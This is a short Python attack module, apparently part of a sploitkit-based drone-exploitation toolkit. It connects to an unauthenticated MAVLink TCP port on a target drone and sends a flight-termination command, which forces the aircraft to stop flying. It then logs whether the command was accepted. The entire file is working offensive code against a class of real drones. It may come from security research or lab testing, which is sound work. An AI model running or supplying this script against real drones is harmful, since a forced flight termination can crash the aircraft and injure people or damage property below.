from sploitkit import Module, Config, Option
from pymavlink import mavutil
import sys

class FlightTermination(Module):
    """Forcefully terminate the drone's flight"""

    # Configuration for the scanner module
    config = Config({
        Option(
            name='target_ip',
            description='IP of your target drone',
            required=True,
            ): "10.13.0.3", # Default value
        Option(
            name='target_port',
            description='MavLink Port',
            required=True,
            ): "5760",  # Default value
    })

    def connect_drone(self, target_ip, target_port):
        """
        Establish a connection to the drone.
        """
        master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
        master.wait_heartbeat()
        self.logger.info("Connected to the drone.")
        return master

    def execute_flight_termination(self, master):
        """
        Send the MAV_CMD_DO_FLIGHTTERMINATION command to terminate the flight.
        """
        master.mav.command_long_send(
            master.target_system,                # Target system ID
            master.target_component,             # Target component ID
            mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION, # Command ID for flight termination
            0,                                   # Confirmation
            1,                                   # Param1: 1 to initiate flight termination
            0, 0, 0, 0, 0, 0                     # Other params unused
        )
        self.logger.info("Flight termination command sent.")

    def run(self):
        # Retrieve the target IP and port from the config
        target_ip = self.config['target_ip']
        target_port = self.config['target_port']

        # Connect to the drone
        master = self.connect_drone(target_ip, target_port)

        # Execute the flight termination
        self.execute_flight_termination(master)

        # Optionally, monitor the drone's status
        while True:
            msg = master.recv_match(blocking=True)
            if not msg:
                continue
            self.logger.info(f"Received message: {msg}")
            if msg.get_type() == 'COMMAND_ACK':
                if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
                    if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                        self.logger.success("Flight termination command accepted.")
                    else:
                        self.logger.failure(f"Failed to execute flight termination command: {msg.result}")
                break